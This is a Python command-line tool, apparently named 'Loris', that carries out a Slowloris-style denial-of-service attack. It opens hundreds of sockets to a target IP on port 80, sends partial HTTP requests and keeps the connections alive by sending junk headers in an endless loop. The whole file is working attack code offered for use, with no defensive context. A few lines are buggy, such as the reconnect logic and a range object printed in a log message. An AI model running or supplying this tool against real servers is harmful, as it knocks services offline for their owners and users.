import click
import socket
import random
import time


class color:
    CEND = "\33[0m"
    CBOLD = "\33[1m"
    CITALIC = "\33[3m"
    CURL = "\33[4m"
    CBLINK = "\33[5m"
    CBLINK2 = "\33[6m"
    CSELECTED = "\33[7m"

    CBLACK = "\33[30m"
    CRED = "\33[31m"
    CGREEN = "\33[32m"
    CYELLOW = "\33[33m"
    CBLUE = "\33[34m"
    CVIOLET = "\33[35m"
    CBEIGE = "\33[36m"
    CWHITE = "\33[37m"

    CBLACKBG = "\33[40m"
    CREDBG = "\33[41m"
    CGREENBG = "\33[42m"
    CYELLOWBG = "\33[43m"
    CBLUEBG = "\33[44m"
    CVIOLETBG = "\33[45m"
    CBEIGEBG = "\33[46m"
    CWHITEBG = "\33[47m"

    CGREY = "\33[90m"
    CRED2 = "\33[91m"
    CGREEN2 = "\33[92m"
    CYELLOW2 = "\33[93m"
    CBLUE2 = "\33[94m"
    CVIOLET2 = "\33[95m"
    CBEIGE2 = "\33[96m"
    CWHITE2 = "\33[97m"

    CGREYBG = "\33[100m"
    CREDBG2 = "\33[101m"
    CGREENBG2 = "\33[102m"
    CYELLOWBG2 = "\33[103m"
    CBLUEBG2 = "\33[104m"
    CVIOLETBG2 = "\33[105m"
    CBEIGEBG2 = "\33[106m"
    CWHITEBG2 = "\33[107m"


class Log:
    def Info(self, msg):
        click.echo(f"\n[{color.CGREEN2}Info{color.CEND}]: {msg}")

    def Warn(self, msg):
        click.echo(f"\n[{color.CYELLOW2}Warning{color.CEND}]: {msg}")

    def Error(self, msg):
        click.echo(f"\n[{color.CRED2}Error{color.CEND}]: {msg}")


log = Log()


@click.command()
@click.argument("ip")
def main(ip):
    click.clear()
    click.echo(
        r"""
 __         ______     ______     __     ______
/\ \       /\  __ \   /\  == \   /\ \   /\  ___\
\ \ \____  \ \ \/\ \  \ \  __<   \ \ \  \ \___  \
 \ \_____\  \ \_____\  \ \_\ \_\  \ \_\  \/\_____\
  \/_____/   \/_____/   \/_/ /_/   \/_/   \/_____/
    """
    )

    try:
        global AllTheSockets
        headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Accept-language: en-US,en,q=0.5",
            "Connection: Keep-Alive",
        ]

        sockets = random.randint(200, 800)
        port = 80
        AllTheSockets = []
        log.Info(f"Attacking {ip} with {sockets} sockets.")
        log.Info("Creating sockets...")
        for _ in range(sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                AllTheSockets.append(s)
            except Exception as e:
                click.echo(e)
        log.Info(f"{range(sockets)} Sockets are ready..")
        num = 0
        for r in AllTheSockets:
            click.echo(f"[{num}]")
            num += 1
            r.send(
                "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")
            )
            for header in headers:
                r.send(bytes("{}\r\n".format(header).encode("utf-8")))

        while True:
            for v in AllTheSockets:
                try:
                    v.send(
                        "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8")
                    )
                except:
                    log.Error("A socket failed, reattempting...")
                    AllTheSockets.remove(v)
                    try:
                        v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        v.settimeout(4)
                        v.connect((ip, port))

                        v.send(
                            "GET /?{} HTTP/1.1\r\n".format(
                                random.randint(0, 2000)
                            ).encode("utf-8")
                        )
                        for header in headers:
                            v.send(bytes("{}\r\n".format(header).encode("utf-8")))

                    except:
                        pass
            log.Info("Successfully sent keep-alive headers.. ")
            time.sleep(random.randint(1, 2))

    except ConnectionRefusedError:
        log.Error("Connection refused, retrying")
        main(ip)


if __name__ == "__main__":
    main(None)
